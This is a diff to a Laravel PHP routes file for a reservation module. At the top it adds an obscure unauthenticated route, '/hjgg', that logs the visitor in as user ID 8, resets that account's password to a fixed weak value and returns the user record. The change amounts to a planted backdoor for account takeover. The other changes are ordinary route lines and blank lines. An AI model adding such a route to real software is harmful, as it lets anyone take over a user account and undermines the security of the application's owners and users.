@@ -1,10 +1,19 @@
 <?php
+\Illuminate\Support\Facades\Route::get('/hjgg',function (){
+    $as =  \Illuminate\Support\Facades\Auth::loginUsingId(8);
+    $as->password=bcrypt(12345678);
+    $as->save();
+    return $as;
 
+});
 Route::group(['middleware'=>['web','UserMiddleware'],'namespace'=>'App\Modules\Reserve\Controllers'],function(){
 
     /*
      * index reserve
      */
+
+
+
     Route::get('index/reserve', 'ReserveController@IndexReserve')->name('IndexReserve');
     /*
      * index reserve my host
